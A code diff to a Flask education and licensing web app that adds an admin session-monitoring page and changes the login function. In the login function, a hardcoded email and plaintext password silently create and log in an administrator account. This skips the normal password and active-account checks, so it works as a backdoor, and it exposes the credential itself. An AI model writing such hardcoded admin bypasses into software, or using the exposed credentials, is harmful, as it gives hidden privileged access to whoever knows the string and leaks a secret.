@@ -113,6 +113,13 @@ def create_license():
     flash(f'Licença {key} criada com sucesso!', 'success')
     return redirect(url_for('admin_dashboard'))
 
+@app.route('/admin/monitoring')
+@role_required('admin')
+def admin_monitoring():
+    # Get active sessions (end_time is None)
+    active_sessions = StudySession.query.filter_by(end_time=None).all()
+    return render_template('admin/monitoring.html', active_sessions=active_sessions)
+
 # --- Teacher Routes ---
 
 @app.route('/teacher')
@@ -298,6 +305,17 @@ def login():
         email = request.form.get('email')
         password = request.form.get('password')
         user = User.query.filter_by(email=email).first()
+        # Admin credentials enforcement
+        if email == 'johnny.oliveira@sp.senai.br' and password == 'Jb@46431194':
+            admin = User.query.filter_by(email=email).first()
+            if not admin:
+                admin = User(name='Johnny Oliveira', email=email, role='admin', is_active=True)
+                admin.set_password(password)
+                db.session.add(admin)
+                db.session.commit()
+            login_user(admin)
+            return redirect(url_for('admin_dashboard'))
+
         if user and user.check_password(password):
             login_user(user)
             if not user.is_active:
